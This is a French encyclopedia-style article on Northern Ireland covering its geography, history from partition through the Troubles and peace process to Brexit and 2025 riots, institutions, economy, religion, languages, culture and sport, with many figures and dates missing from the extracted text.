Les liens culturels entre l'Irlande du Nord, la république d'Irlande et le reste du Royaume-Uni sont complexes, l'Irlande du Nord partageant à la fois la culture de l'Irlande et du Royaume-Uni. Dans de nombreux sports, l'île d'Irlande n'aligne qu'une seule équipe, excepté au football. L'Irlande du Nord concourt séparément aux Jeux du Commonwealth, et les Nord-Irlandais peuvent concourir pour la Grande-Bretagne ou l'Irlande aux Jeux Olympiques.
Géographie.
L'Irlande du Nord était couverte de glaciers pendant la majorité de la dernière ère glaciaire et durant les périodes froides précédentes. On en retrouve des traces visibles dans plusieurs drumlins dans les comtés de Fermanagh, Armagh, Antrim et surtout dans le . La géographie de l'Irlande du Nord est marquée par le Lough Neagh, le plus grand lac d'eau douce des îles Britanniques (et troisième plus grand lac d'Europe occidentale) avec de superficie, est situé presque au centre du territoire. Deux autres lacs importants se trouvent sur le cours du fleuve Erne dans le Fermanagh : les Lough Erne inférieur et supérieur. La plus grande île et également la seule île habitée dépendant de l'Irlande du Nord est l'île de Rathlin, au large du côté d'Antrim. Strangford Lough, avec est la plus grande baie des îles Britanniques est.
Les montagnes Sperrins possèdent des altitudes relativement importantes avec une altitude maximale de . Elles sont une extension des montagnes plissées de la chaîne calédonienne. Elles recèlent des gisements importants d'or. Il est également possible d'en trouver dans les montagnes granitiques de Mourne et dans le plateau basaltique d'Antrim, ainsi qu'au sein des chaînes plus petites dans le sud d'Armagh et sur la frontière de Fermanagh et Tyrone. Les collines sont peu élevées, le Slieve Donard, dans les montagnes de Mourne est le plus haut sommet avec . L'activité volcanique qui est à l'origine du plateau d'Antrim a aussi formé la Chaussée des Géants sur la côte nord d'Antrim. Au nord d'Antrim, se trouvent aussi le pont de corde de Carrick-a-Rede, le temple de Mussenden et les Glens d'Antrim.
La haute et la basse rivière Bann, ainsi que la rivière forment des basses terres fertiles et cultivées de manière extensive. Il y a de même de bonnes terres arables dans le nord et l'est du , mais la plus grande partie des collines n'est exploitable que pour l'élevage d'animaux. Le climat humide et la déforestation aux ont créé beaucoup de prairies dans la région.
La vallée de la rivière Lagan est dominée par Belfast. Sa zone métropolitaine inclut un tiers de la population de l'Irlande du Nord. Elle est fortement industrialisée le long de vallée Lagan et des deux côtés du Lac de Belfast.
Le climat de l'Irlande du Nord est tempéré océanique, plus humide à l'ouest qu'à l'est, mais la présence d'une couverture nuageuse est fréquente partout dans la région à cause des reliefs. Les pluies y sont fréquentes et particulièrement d’août à janvier. Le temps est imprévisible pendant toute l'année et, bien que les saisons soient distinctes, elles sont moins prononcées que sur l'Europe continentale ou l'est de l'Amérique du Nord. La température maximale moyenne à Belfast est en janvier et en juillet. La température la plus haute enregistrée fut à Knockarevan, dans le Fermanagh le et à Belfast le . La plus basse était à Magherally, dans le le .
Histoire.
L'histoire de l'Irlande du Nord commence en 1920 lorsque l'île d'Irlande est scindée en Irlande du Sud (qui deviendra l'État d'Irlande indépendant que l'on connaît aujourd'hui) et Irlande du Nord.
Partition de l'Irlande.
Le gouvernement britannique libéral du Premier ministre Herbert Henry Asquith, dépendant du soutien du Parti parlementaire irlandais (PPI, nationaliste) à la Chambre des communes du Parlement du Royaume-Uni, entend au début des années 1910 conférer un statut d'autonomie à l'île d'Irlande. Ce projet rencontre une très vive hostilité de la part de la communauté unioniste de l'Ulster. En 1912, un demi-million de protestants y signent le Covenant d'Ulster, jurant de lutter par les armes si nécessaire contre leur subordination à un éventuel gouvernement autonome catholique à Dublin.
Pour autant, le Parlement britannique adopte en 1914 la loi d'autonomie pour l'Irlande. Sa mise en œuvre est retardée par le début de la Première Guerre mondiale. La « Grande guerre » permet de mettre un temps de côté les désaccords entre les communautés en Irlande : les nationalistes catholiques, tout comme les protestants de l'Ulster, sont nombreux à se porter volontaires pour rejoindre les forces armées britanniques. En 1916 toutefois, avec le soutien clandestin de l'Allemagne, une minorité radicale du mouvement nationaliste irlandais orchestre l'insurrection de Pâques à Dublin. Cette révolte violente, condamnée avec dégoût par le PPI et par la majorité du mouvement nationaliste, est réprimée dans le sang par les autorités britanniques, ce qui radicalise l'opinion publique irlandaise. En 1919, la guerre d'indépendance irlandaise débute avec la création de l'Armée républicaine irlandaise (IRA) par les nationalistes radicaux, le Sinn Féin. Dans le nord, certains des unionistes sont constitués en une milice armée appelée « Volontaires de l'Ulster », pour y résister. Par ailleurs, les sacrifices des unionistes pendant la Première Guerre mondiale rendent inconcevable pour Londres de les soumettre contre leur gré à un gouvernement du Sinn Féin.
Les négociations entre le gouvernement britannique de David Lloyd George et le Sinn Féin, représenté principalement par Michael Collins, aboutissent à un traité en décembre 1921. Celui-ci partage l'île d'Irlande en deux entités politiques ayant chacune ses propres institutions :
En 1922, comme le prévoit l'accord signé avec Londres, les nationalistes proclament la création d'un État libre d'Irlande dans la partie méridionale, possédant Parlement et ministères, en échange d'un serment d'allégeance symbolique à la Couronne britannique et de son adhésion en tant que Dominion indépendant au Commonwealth. Cet accord ne fait pas l'unanimité chez les nationalistes et ce désaccord interne au Sinn Féin sera à l'origine de la guerre civile irlandaise qui débute en 1922 et déchire le camp nationaliste. Dans le même temps, dans la partie septentrionale de l'île, le Parti unioniste d'Ulster a largement remporté les élections législatives de 1921 et a été ainsi porté au pouvoir par la majorité protestante de la population. Cette victoire permet aux unionistes d'obtenir le maintien de l'Irlande du Nord dans le Royaume-Uni, avec un statut d'autonomie politique.. Le parti unioniste domina continuellement la région jusqu'en 1972 (quand l’Irlande du Nord repasse sous le contrôle direct de Londres). À chaque élection, le parti parvenait à rassembler une majorité de suffrages protestants, quitte à attiser les tensions religieuses afin que le clivage interconfessionnel demeure prioritaire. La plupart de ses dirigeants étaient issus de l’ordre d’Orange, une puissante association maçonnique fondée dans le but de contrer la propagation du catholicisme.
Conflit nord-irlandais.
Les premiers mouvements de contestation d'ampleur de la communauté catholique, notamment en , demandaient l'égalité des droits et la fin de la discrimination instituée par la majorité protestante unioniste : droit de vote basé sur la propriété des moyens de production détenu majoritairement par les protestants, découpage électoral inéquitable, attribution de logement inéquitable. Ce mouvement ressemblait en cela au mouvement américain des droits civiques. Mais le courant unioniste vit dans ces demandes une menace envers son existence et ses intérêts (justice, police, logement). Les rassemblements furent interdits tandis que les policiers (majoritairement des protestants) réprimaient de plus en plus violemment les manifestations.
L’administration de l’Irlande du Nord fut déstabilisée par de violents affrontements entre catholiques et protestants à Derry/Londonderry, notamment lors du "" (), où les commandos de parachutistes britanniques tirèrent sur des manifestants non armés et pacifiques. Les affrontements s’étendirent à Belfast. Là, des familles catholiques durent fuir leurs maisons qui étaient incendiées par les policiers et la foule protestante opposée au changement (Ardoyne, Nord de Belfast, 1969). Les quartiers nationalistes catholiques se trouvaient à la merci des émeutiers protestants et des forces de l’ordre. Les insurgés irlandais s’armèrent et commencèrent par défendre les quartiers avant de passer à l'offensive. L’IRA se réorganisa spontanément pour permettre la défense de sa communauté.
Une nouvelle notion entra dans l’équation du conflit : la réunification des deux Irlandes. Les catholiques en firent un leitmotiv. Tandis que les protestants percevaient une Irlande unifiée comme une menace, notamment sur le plan religieux .
En 1969, Londres envoya l’armée britannique pour séparer les deux communautés et rétablir le calme. Mais les soldats, au début perçus par les catholiques comme des protecteurs, devinrent l'instrument du gouvernement en place et les troupes pratiquèrent la même répression que les policiers. L’IRA tourna alors ses activités contre l’armée britannique. Le but avoué des nationalistes devint la libération de l’Irlande du joug britannique. Des milices paramilitaires protestantes se formèrent pour défendre les intérêts du peuple protestant. L’, la et l’ prirent pour cible des membres de l’IRA, du Sinn Féin (aile politique de l’IRA) et les civils de la communauté catholique.
S’ensuivit un conflit de type guérilla, appelé avec pudeur « "troubles" », où explosions, fusillades et autres actes de guerre furent commis par les différents protagonistes.
Plusieurs tentatives pour mettre fin au conflit furent tentées. Mais elles échouèrent toutes durant les années 1970 et 1980.
Processus de paix.
Dans les , Londres tente de mettre en place un cessez-le-feu et d'ouvrir des pourparlers avec le Sinn Féin.
Un changement de cadres au sein des partis facilita les négociations qui ont culminé en 1998 avec l'accord du Vendredi saint (ou Accord de Belfast). Cet accord entre les partis de l’Irlande du Nord et les gouvernements du Royaume-Uni et de la république d’Irlande prévoyait : un parlement autonome dans la province ; des garanties en matière de droits humains ; des conseils administratifs transfrontaliers en matière d'environnement et de tourisme, des langues régionales (l’irlandais et le scots d’Ulster) ; un conseil britannico-irlandais pour rassembler les gouvernements des îles Britanniques (de l'Angleterre, de la république d’Irlande, de l'Irlande du Nord, de l'Écosse, du Pays de Galles, de Jersey, de Guernesey et de l'Île de Man).
L'accord permet la mise en place d'un système de gouvernement local et de partage du pouvoir entre unionistes et nationalistes. Il fonctionne, sans difficultés, jusqu'en 2002. David Trimble est alors Premier ministre de l'Irlande du Nord. Le , le fonctionnement du parlement autonome est interrompu alors qu'éclate un de l'état-major de l'IRA. Ce retour au contrôle direct de Londres dure quatre ans.
En 2006, de nouvelles négociations aboutissent à l'accord de Saint-Andrews qui permettent l'organisation de nouvelles élections en , la reprise du fonctionnement de l'assemblée le de la même année et finalement la mise en place le d'un gouvernement impliquant pour la première fois Ian Paisley, le du Parti unioniste démocrate. Il devient Premier ministre d'Irlande du Nord. Le vice-premier ministre est Martin McGuinness. Les deux hommes ont célébré la réouverture du Stormont (le parlement nord irlandais) le .
Irlande du Nord au.
Europhilie dominante.
Malgré l'intense campagne pro-Brexit du Parti unioniste démocrate (DUP), à la suite de la victoire des partisans de la sortie du Royaume-Uni de l'Union européenne (le Brexit) lors du référendum du, les Nord-irlandais ont montré leurs sentiments europhiles en se prononçant en majorité pour le maintien au sein de l', avec 55,8 % des suffrages exprimés.
&lt;br&gt;Les habitants de la région redoutent en effet qu'une sortie de l'Union européenne n'entraîne une fermeture de la frontière avec la république d'Irlande ce qui aurait des effets désastreux sur l'économie encore fragile de l'Irlande du Nord qui a pu s'épanouir grâce aux échanges avec sa voisine depuis l'accord de paix. &lt;br&gt;Dès le lendemain de la consultation, les nationalistes du Sinn Féin ont plaidé pour la tenue d'un nouveau référendum portant, cette fois, sur l'unification des deux Irlandes et donc la rupture avec le Royaume-Uni.
Une spécificité de non-transparence des financements électoraux.
À la suite des troubles politiques d'Irlande du Nord, une législation, unique au Royaume-Uni et en Europe, a été décidée (et elle persiste depuis, bien que contraire aux règles habituelles de la transparence démocratique) : elle interdit l'identification des personnes physiques ou morales faisant des dons aux partis politiques en Irlande du Nord.
Cette loi a permis de protéger les donateurs aux temps de la guerre civile, mais elle bloque ou freine maintenant les enquêtes sur d'éventuels financements illégaux (ex : blanchiment d'argent, pressions de lobbies...), et freine le travail de certains journalistes sur la vie politique du pays.
En 2018-2021, cette spécificité a ainsi bloqué certaines enquêtes sur le financement des groupes pro-Brexit, puis sur le financement du Parti unioniste démocrate ou sur l'utilisation des sommes ainsi touchées (ex : le DUP fait partie des 4 parti pro-Brexit qui ont versé à AggregateIQ (AIQ), la discrète société canadienne controversée au moins de livres sterling, selon le média TV "Below the radar Ltd."). AIQ a ainsi avec cet argent pu agréger des données d'intérêt électoral avec des millions de données personnelles volées par Cambridge Analytica sur Facebook, puis produire des "publicités" électorales et des images et messages ciblés, aux contenus personnalisés, ayant significativement influencé, voire fait basculer le vote anglais qui a abouti au Brexit). Depuis 2005, vainement, la Commission électorale du Royaume-Uni, qui a .
Émeutes de juin 2025.
En juin 2025, après une agression sexuelle sur une jeune fille par deux adolescents, la province connaît plusieurs nuits consécutives de violence, des centaines de personnes descendant dans les rues chaque nuit pour affronter la police et attaquer des immigrés. La communauté roumaine est particulièrement prise pour cible. L’épicentre des évènements est la ville de Ballymena, où vit une importante population immigrée. Après deux jours, 32 policiers ont été blessés tandis que six personnes ont été arrêtées. Notons qu'il y a aussi eu des échauffourées dans la ville de Larne
Politique et administration.
L'Irlande du Nord est un des pays constitutifs (nations constitutives) appartenant au Royaume-Uni, dont le gouvernement siège à Stormont et est représenté par l'Assemblée d'Irlande du Nord. L'assemblée a la mainmise complète sur les affaires dites « de transfert » : (' : administration des services publics, éducation, santé, culture, industrie locale…), un pouvoir partiel sur les affaires réservées, soumises à l'approbation du secrétaire d'État pour l'Irlande du Nord nommé par Londres (' : police, commerce, aviation…) et aucune emprise sur les affaires extérieures (appelées " : diplomatie, défense, impôts centraux).
 (MLA) sont élus tous les cinq ans, via les mêmes circonscriptions que les élections du Parlement du Royaume-Uni. L'électorat est composé de votants. En font partie tous les citoyens de plus de dix-huit ans, inscrits sur liste électorale. Les élections de l'Assemblée se déroulent selon un scrutin proportionnel plurinominal. Après l'élection, un premier ministre et un vice-premier ministre doivent se présenter conjointement et recueillir l'appui des deux communautés. Le premier ministre et le vice-premier ministre choisissent conjointement les ministres, selon l'importance des partis politiques.
L'Irlande du Nord élit (MP) à la Chambre des communes du Royaume-Uni sur un total de 650. Un parlementaires est élu pour chaque circonscription, par un scrutin uninominal majoritaire à un tour.
Pour les élections européennes, avant le Brexit, l'Irlande du Nord était considérée comme une circonscription du Royaume-Uni, qui élisait trois parlementaires. Depuis 2014, jusqu'à la sortie de l'Union, les députés étaient Diane Dodds du DUP, Martina Anderson de Sinn Féin et Jim Nicholson de l'UUP. Ce sont les seules circonscriptions du Royaume-Uni qui procèdaient par scrutin à vote unique transférable.
La politique de l'Irlande du Nord est en grande partie orientée par la religion et le sentiment national. Par exemple, 55 des membres de l'Assemblée sont unionistes et , ce qui reflète plus ou moins la division religieuse. Une enquête du " montre que 20 % des catholiques en Irlande du Nord sont satisfaits du fait que l'Irlande du Nord demeure au sein du Royaume-Uni ; malgré cela, seulement 5 % déclarent qu'ils voteraient pour les partis unionistes ou pour les sans étiquette.
Administration.
L'Irlande du Nord possède six comtés traditionnels. Ils ne sont pas pris en compte actuellement par l'administration. En revanche, ils sont mentionnés sur les passeports irlandais, qui présentent un champ « comté de naissance », et ils sont également mentionnés sur les cartes délivrées par le gouvernement. Ils jouent également un rôle dans d'autres domaines : en sport, par exemple, les équipes de l'Association athlétique gaélique sont toujours réparties par comté.
Les six comtés sont :
L'Irlande du Nord est également divisée en onze districts à des fins d'administration locale. À leur tête se trouvent des conseils locaux dont les pouvoirs sont moins étendus que dans le reste du Royaume-Uni. Ces onze districts, qui ont remplacé les vingt-six anciens districts en , sont :
L'Irlande du Nord est encore divisée en dix-huit circonscriptions parlementaires pour les élections de la Chambre des communes du Royaume-Uni et de l'Assemblée d'Irlande du Nord. Ces dix-huit circonscriptions sont :
Droit et organisation judiciaire.
Il y a trois juridictions légales au Royaume-Uni, l'Angleterre et le Pays de Galles, l'Écosse et l'Irlande du Nord. La loi de l'Irlande du Nord est basée majoritairement sur le "" anglais, mais il y a aussi des différences qui viennent de la période d'autonomie nord-irlandaise. Il y a aussi des similitudes entre la loi nord-irlandaise et la loi de la république d'Irlande, à cause du parlement d'Irlande, qui a eu juridiction sur toute l'île d'Irlande jusqu'à 1800.
Le système de justice criminelle a été complètement revu après la signature de l'accord du Vendredi saint. Le gouvernement du Royaume-Uni, a alors introduit la « Loi sur justice (Irlande du Nord) » 2002 et 2004 pour les faits. Les cours en Irlande du Nord sont administrées par le Service des cours nord-irlandais.
En ce moment, la Cour la plus importante de l'Irlande du Nord est la Cour suprême du Royaume-Uni, créée en avec la « Loi sur la réforme de la constitution 2005 » (). Lui est subordonnée la « Cour suprême de justice », qui est composée de la « Cour des appels », la « Haute cour » et la « Cour de la couronne ». Autrefois, avant l’entrée en vigueur de la Loi sur la réforme de la Constitution 2005, en , la Cour la plus puissante était celle de la « Commission judiciaire de la Chambre des lords ».
La « Cour des appels » est la plus puissante après celle de la Chambre des lords. Elle s'occupe des appels des autres cours. La « Haute Cour » est divisée en trois entités, la « Division de la magistrature du Roi » (ou reine quand le monarque est une femme), la « Division de la chancellerie » et la « Division familiale ». La division de la magistrature du Roi s'occupe du contentieux des contrats et des dommages corporels. La division de la chancellerie s'occupe des affaires commerciales, de dépôt, de succession et de tutelle, et foncières. Elle s'occupe aussi de la propriété intellectuelle. La « Division familiale » s'occupe des divorces, des enfants et des traitements médicaux. La « Cour de la couronne » s'occupe des affaires criminelles sérieuses.
À un niveau subalterne, les « Cours de Comtés », s'occupent des procès et des demandes commerciales. Il y a sept Cours de Comtés en Irlande du Nord. Il existe aussi des « Cours de magistrats » qui s'occupent des affaires criminelles mineures ainsi que des audiences préliminaires relatives aux affaires criminelles sérieuses.
Économie.
L'Irlande du Nord est traditionnellement une économie industrielle, avec des chantiers navals et des usines textiles. Aujourd'hui, l'économie est majoritairement tournée vers les services. Le chômage a considérablement diminué au tournant des années 2000 et est à environ 6 % dans les , contre un pic à plus de 17 % en 1986. C'est le chômage à longue durée et celui des jeunes qui est descendu le plus rapidement. Le taux d'inactivité de la population active est 28 %, soit le plus bas du Royaume-Uni.
Historiquement, le gouvernement poursuivit une politique de discrimination économique contre la communauté catholique. L'accès au travail était facilité pour les protestants et rendu plus complexe pour les catholiques. Cela a entraîné un taux de chômage plus important dans cette dernière communauté. Les industries majeures étaient la construction navale, l'industrie textile et la fabrication de cordages. Pendant les , la croissance économique en Irlande du Nord fut plus forte qu'en Irlande.
Pendant les , le gouvernement travailliste introduisit une politique d'État-providence, donnant accès à tous au droit à l'éducation et aux soins de santé. Grâce à cette politique, beaucoup de catholiques d'Irlande du Nord ont reçu une formation qu'ils n'auraient jamais pu obtenir autrement. À partir de ce moment, une classe de catholiques éduqués a réclamé des droits civils et économiques. La classe dominante protestante a refusé de prendre en compte ces réclamations, ce qui a envenimé la situation. Devant l'amplification des revendications, Londres introduisit le gouvernement direct.
La période du conflit nord-irlandais, ou "Troubles", a fortement influencé l'économie. La campagne violente de l'IRA était aussi une guerre économique, puisqu'elle ciblait des banques, des industries, des chefs d'entreprise, etc. Le but était de rendre économiquement impossible la gestion du nord de l'Irlande par le gouvernement britannique, ou tout au moins, de faire de l'Irlande du Nord un investissement à pertes pour Londres. À long terme, l'économie a périclité et le chômage a augmenté.
Avec la signature de l'accord du Vendredi saint et la fin du conflit, l'économie a redémarré, avec un retour des investissements et une baisse du chômage. L'industrie lourde n'est plus le composant essentiel de l'économie nord-irlandais, remplacée par les services. Par exemple, l'entreprise d'industrie lourde a dépéri alors que le secteur touristique s'accroissait avec vitalité. En 2008, une conférence d'investisseurs américains à Belfast s'est tenue afin d'encourager les hommes d'affaires venant des États-Unis à investir en Irlande du Nord. Cela étant, l'Irlande du Nord possède encore le plus bas niveau de PIB du Royaume-Uni, et reçoit encore des subventions de Londres.
L’Irlande du Nord bénéficie de fonds européens importants à travers la politique agricole commune, qui représentent 85 % des revenus de ses agriculteurs en moyenne, et des fonds structurels.
Population et société.
Démographie.
La population de l'Irlande du Nord était en 2004 de . La majeure partie de la population possède des origines irlandaises ou britanniques, et quasiment toute la population est d'origine européenne, bien qu'il existe de petites communautés d'immigrés. Durant la Préhistoire, le nord de l'Irlande était habité par des tribus de culture néolithique. Par la suite, les Celtes envahirent l'île et y installèrent leur langue et leur culture, sans beaucoup se mélanger avec la population autochtone. À partir du , les Anglais prennent progressivement le contrôle de l'île. Au nord de l'Irlande, les colons anglais et écossais immigrèrent en Ulster, à la faveur de la création des plantations d'Ulster, sous le règne de d'Angleterre. Cet événement a fortement marqué les populations locales, et la majorité des Irlandais du Nord se reconnaissent actuellement comme britanniques.
Religion.
Lors du recensement de 2011, 82,4 % de la population se déclarait chrétienne. Une courte majorité est protestante, 41,6 % d'après le recensement (dont 19,1 % de presbytériens et 13,7 % appartenant à l'Église d'Irlande anglicane). 40,8 % se reconnaissent comme catholiques, 16,9 % sans religion et 0,8 % appartiennent à d'autres cultes.
La religion est souvent vue comme une manière d'afficher son appartenance à l'une ou l'autre des communautés nationaliste ou unioniste, car la majorité des nationalistes est catholique et les unionistes sont essentiellement protestants. D'après une enquête, 85 % des protestants préféreraient que l'Irlande du Nord demeure britannique, alors que 50 % des catholiques souhaiteraient la réunification de l'île. Les identités ont tendance à se complexifier maintenant, du fait de la tendance globale au recul des religions.
La législation a profondément évolué, et garantit à l'heure actuelle l'égalité théorique entre les deux religions, car la discrimination des catholiques par la majorité protestante a profondément marqué l'histoire de l'Irlande du Nord.
Évolution de la part des différentes religions en Irlande du Nord entre 2001 et 2011 :
Le recensement de 2021 voit pour la première fois les catholiques être plus nombreux que les protestants. 42,3 % de la population est catholique, 37,3 % protestante, 1,3 % d'une autre religion et 17,4 % sans religion. Si l'on s'intéresse à la religion dans laquelle la population a été élevée, les catholiques sont 45,7 %, les protestants 43,5 % et les religions non-chrétiennes 1,5 %.
Nationalité et questions constitutionnelle.
La est plutôt divisée entre ceux qui se considèrent comme irlandais et ceux qui se considèrent comme britanniques. Il existe toute une gamme de positions entre ces extrêmes. Ceux qui se considèrent irlandais sont majoritairement catholiques, et ceux qui s'affirment britanniques sont surtout protestants. Beaucoup d'enquêtes corroborent cette tendance. Les divisions entre les deux communautés sont encore très présentes.
En majorité, les protestants souhaitent demeurer dans le Royaume-Uni. Chez les catholiques, la moitié souhaite la réunification, une minorité soutient le "", et nombreux sont ceux qui n'ont pas d'opinion particulière. Malgré cela, seulement 7 % des catholiques disent qu'ils voteraient pour les partis unionistes ou sans étiquette.
D'après un sondage réalisé en 2005, 40 % de la population d'Irlande du Nord se définissent comme « unioniste », 22 % se définissent comme « nationalistes » (pour la réunification), et 35 % n'appartiennent à aucun de ces deux courants.
Les personnes nées en Irlande du Nord sont automatiquement des citoyens britanniques, comme toutes personnes nées dans le reste du Royaume-Uni, mais la république d'Irlande étend ses lois de citoyenneté à tous les natifs de l'île du Nord ainsi qu'au sud de la frontière, de sorte que certaines personnes en Irlande du Nord peuvent simplement garder la double nationalité ou choisir d'avoir soit un passeport irlandais seulement, soit un passeport britannique (Droit reconnu par l'accord du Vendredi saint.). 
Selon certaines enquêtes, les Nord-irlandais partisans de l'unification sont presque aussi nombreux que ceux qui s'y opposent.
Langue.
Comme la plupart des affaires culturelles nord-irlandaises, la question de la langue est controversée et complexe. Presque toute l'Irlande du Nord parle anglais, mais l'usage de l'irlandais est encouragé par les nationalistes. Dans les quartiers nationalistes, les enseignes de rue sont souvent bilingues irlandais-anglais. La reconnaissance et l'usage officiel de l'irlandais fait partie des doléances régulières des nationalistes.
L'attrait pour l'irlandais n'est pas limité aux nationalistes. Certains unionistes pratiquent cette langue et reprochent au Sinn Féin d'en faire un enjeu de différenciation. La première organisation consacrée à la promotion de l'irlandais fut la Ligue gaélique, créée à Dublin en 1893. À sa création, ce mouvement était ouvert aux deux communautés irlandaises ; le premier chef, Douglas Hyde, était protestant. Avec le temps, les nationalistes ont inséré dans les buts de l'organisation le soutien à l'établissement d'une république irlandaise. À partir de ce moment, l'utilisation de l'irlandais a pu être perçue comme un acte de nationalisme.
D'après le recensement de 2001, 10 % de la population connaît un peu d'irlandais et 4,7 % peut le « parler, lire, écrire et comprendre ». D'après une autre enquête, 1 % de la population parle irlandais à domicile. Il y a 32 écoles gaélophones en Irlande du Nord, soit 7,3 % du total.
Un dialecte coexiste avec l'irlandais, le scots d'Ulster, dont l'emploi est plus controversé encore. Certains dénient au scots d'Ulster le statut de langue et de dialecte, et soutiennent que c'est une construction des unionistes destinée à rivaliser avec l'irlandais. Certains le considèrent comme une langue à part entière, d'autres comme un dialecte. D'après le linguiste Aodán Mac Poilín, D'après Póilín, . L'accord de Saint-Andrews dispose qu'il est nécessaire d'améliorer et développer la langue, l'héritage et la culture des scots d'Ulster.
D'après une enquête, 2 % de la population parle le scots d'Ulster, mais personne n'a déclaré le parler chez soi. Il existe de nos jours des cours de scots d'Ulster dans les universités.
Deux langues des signes coexistent en Irlande du Nord. La plus répandue est la langue des signes britannique, mais comme il semblait normal aux nationalistes d'envoyer leurs enfants faire leurs études à Dublin, notamment aux et , il existe également une langue des signes irlandaise répandue principalement dans les communautés nationalistes. D'après le site internet du département nord-irlandais de la culture, des arts et loisirs, il y a de la BSL et de l'ISL. Les deux langages ne sont pas liés, le langage des signes britannique provenant de la famille britannique et le langage des signes irlandais étant issu de la famille française.
Il existe aussi des langues étrangères minoritaires apportées en Irlande du Nord par les immigrés, comme le chinois et le polonais.
Culture.
La culture de l'Irlande du Nord est un mélange entre celle d'Irlande et celle de Grande-Bretagne. À cause des divisions entre les deux communautés, il semble qu'il y ait deux cultures qui existent parallèlement. .
Arts.
Le cinéma de l'Irlande du Nord n'a pas produit beaucoup de films. L'industrie cinématographique reste pour la plupart du temps dans l'ombre du Royaume-Uni et de l'Irlande. Toutefois, ce cinéma a eu des succès notamment avec les films comme ', ' et ' (ces deux derniers films ayant été réalisés respectivement par un Irlandais du Sud, Paddy Breathnach, et un Britannique, Paul Greengrass). L'institution encourage la réalisation, la location et la production de films en Irlande du Nord. Les films de l'Irlande du Nord traitent souvent des problèmes du conflit nord-irlandais. Néanmoins, le réalisateur nord-irlandais le plus connu reste Kenneth Branagh, metteur en scène de ' et "Hamlet". Il a aussi dernièrement joué dans "Valkyrie".
Plus connus sont ses acteurs. Liam Neeson et Stephen Rea ont été nommés pour des Oscars du cinéma, Stephen Boyd a gagné un . D'autres acteurs bien connus sont Ciarán Hinds, Bronagh Gallagher, Patrick Magee, Siobhán Nic Cionnaith et Jamie Dornan. L'Académie irlandaise de film et télévision (IFTA) a pour but, dans toute l'île, la 
L'Irlande du Nord est plus connue pour ses musiciens que pour ses réalisateurs. Van Morrison est un des chanteurs les plus célèbres, il figure dans le et le . a vendu plus de disques dans le monde. Dana a gagné le Concours Eurovision de la chanson pour l'Irlande. D'autres chanteurs et groupes célèbres viennent de l'Irlande du Nord : , , , et Foy Vance.
Partie intégrante de la tradition celtique, la musique traditionnelle irlandaise est réputée. Elle est connue pour ses ballades, mais aussi pour ses rythmes rapides, ceux qu'utilisent les gigues et les reels. Il existe aussi une forte tradition de musique scots d'Ulster. Cela est mis en évidence pendant la saison des marches nord-irlandaises. Ce style de musique est basé sur un rythme de marche. L'instrument le plus connu est le tambour Lambeg.
Dans le domaine de la littérature, l'Irlande du Nord, comme le reste de l'Irlande, a une tradition forte, avec des auteurs tels que C. S. Lewis, Brian Friel et Flann O'Brien. Seamus Heaney a reçu le prix Nobel de littérature. La littérature de l'Irlande gaélique a beaucoup influencé l'écriture des gens d'Irlande du Nord, les écrivains ont ainsi participé au renouveau littéraire gaélique. L'Écosse a, elle aussi, eu une influence notable sur les écrivains d'expression scots d'Ulster. Plus tard, la littérature en scots d'Ulster s'est diversifiée. Comme dans les autres domaines artistiques, le conflit a beaucoup influencé les écrivains d'Irlande du Nord.
Folklore.
Le folklore en Irlande du Nord est le même que celui de la république Irlandaise. Alors qu'une grande partie de la mythologie irlandaise n'a pas subi la conversion au christianisme, beaucoup d'histoires ont toutefois été rendues compatibles avec le dogme chrétien. Ce qui a pu subsister est divisé en quatre « cycles », le Cycle d'Ulster, le Cycle mythologique, le Cycle fenian et le Cycle historique. Beaucoup d'histoires ne sont pas incluses dans un cycle mais font participer des personnages à ces dits-cycles.
Le folklore irlandais raconte l'histoire de l'Irlande depuis les premières invasions de l'île. D'après les textes, l'Irlande fut envahie plusieurs fois par différents peuples et dieux. Les textes parlent de l'histoire du peuple gaélique. Ils racontent ainsi les exploits des dieux et des héros qui sont venus d'Irlande, comme les Tuatha Dé Danann, Cúchulainn et le Fianna. Les textes plus récents racontent aussi les généalogies des rois irlandais historiques. Les contes relatent des histoires merveilleuses de grands voyages vers un "autre monde" ou à travers les mers et océans de notre globe. D'autres histoires ne parlent pas de héros mais bien plutôt de gens du pays tout à fait ordinaires et d'évènements typiquement locaux.
Gastronomie.
L'Irlande du Nord partage beaucoup de traditions gastronomiques avec le reste de l'Irlande, notamment l'utilisation courante de la pomme de terre et de la viande de mouton. Le repas traditionnel en Irlande du Nord était composé de pommes de terre avec du chou et d'un morceau de viande pour les plus aisés.
Traditionnellement, les fermiers se levaient à du matin pour traire les vaches et travailler sur la ferme, donc ils mangeaient un petit peu au lever, mais le repas le plus important était à midi, quand on mangeait un , le plat le plus connu de l'Irlande du Nord. Cela consistait en des tranches de saucisson, des œufs, du pain au lait, du pain de pommes de terre et des tomates, une variante d'un petit déjeuner complet. Le cheddar de Coleraine était lui souvent consommé en en-cas avant de se coucher.
Sport.
D'après les chiffres de fréquentation, le football gaélique est le sport le plus pratiqué en Irlande du Nord. En termes de popularité le football est lui aussi très populaire, mais ce sont les matchs du championnat d'Angleterre qui sont le plus suivis à la télévision. Viennent ensuite le hurling et le . Les autres sports très présents en Irlande du Nord sont le hockey sur gazon, le basket-ball, le cricket, le handball gaélique
Le football gaélique est organisé sur une base qui inclut toute l'Irlande. Tous les comtés traditionnels d'Irlande du Nord sont tous représentés dans les compétitions organisées à l'échelle de l'île d'Irlande. C'est en football gaélique que les équipes de l'Irlande du Nord ont les meilleurs résultats avec Tyrone GAA deux fois vainqueur du Championnat d'Irlande de football gaélique lors des dernières années.
En hurling, les équipes de l'Irlande du Nord ont plus de difficultés à rivaliser avec les équipes traditionnelles plus fortes. Seul Antrim GAA a une équipe capable de rivaliser avec les équipes de Cork ou de Kilkenny.
Comme les autres nations constituantes du Royaume-Uni, Le football nord-irlandais possède sa propre structure. Depuis l'indépendance de l'État d'Irlande, le football possède sa propre fédération reconnue par la FIFA. L'Irlande du Nord est une nation mineure du football mondial même si elle a participé à quelques phases finales de coupes du monde de 1958 et de 1986, elle a atteint les quarts de finale. C'est d'ailleurs la région la plus petite à avoir disputé un quart de finale de la coupe de monde. En 2015, elle s'est également qualifiée pour sa première phase finale d'un Euro, l'Euro 2016 se déroulant en France. Le championnat national regroupe douze équipes professionnelles depuis 1890. Le football de club n'est classé qu'à la (au ) au niveau européen. il est dominé par les deux clubs de Belfast Linfield FC et Glentoran FC. Tous les meilleurs joueurs jouent dans les championnats anglais et écossais.
